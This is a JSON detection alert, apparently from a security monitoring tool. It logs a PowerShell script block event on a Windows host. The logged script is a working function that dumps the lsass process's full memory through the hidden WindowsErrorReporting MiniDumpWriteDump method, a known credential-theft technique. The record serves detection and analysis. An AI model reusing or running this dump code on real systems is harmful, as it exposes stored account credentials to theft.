{"timestamp": "2020-06-30 14:24:08.254604", "rule_name": "PowerShell Execution", "severity": "medium", "score": 6, "event_id": 4104, "computer": "MSEDGEWIN10", "description": "PowerShell script block logging event.", "mitre_technique": "T1059.001", "matched_rules": ["PowerShell Execution"], "raw_event": {"EventID": 4104, "TimeCreated": "2020-06-30 14:24:08.254604", "Computer": "MSEDGEWIN10", "Provider": "Microsoft-Windows-PowerShell", "Channel": "Microsoft-Windows-PowerShell/Operational", "Level": 3, "EventData": {"MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": "function Memory($path)\n{\n\t\t\t  \n\t\t\t  \n\t\t$Process = Get-Process lsass\n\t\t$DumpFilePath = $path\n\t\t\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\n\t\n\t\t\t\n\t\t\t  #\n\t\t$ProcessId = $Process.Id\n\t\t$ProcessName = $Process.Name\n\t\t$ProcessHandle = $Process.Handle\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\n\t\t\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\n\t\t\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\n\t\t\t  \n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\n\t\t\t  \n\t\t$FileStream.Close()\n\t\t\n\t\tif (-not $Result)\n\t\t{\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\n\t\t\t\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\n\t\t\t\n\t\t\tthrow $ExceptionMessage\n\t\t}\n\t\telse\n\t\t{\n\t\t\t\"Memdump complete!\"\n\t\t}\n\t\n}", "ScriptBlockId": "27f08bda-c330-419f-b83b-eb5c0f699930", "Path": "C:\\Users\\Public\\lsass_wer_ps.ps1"}}}
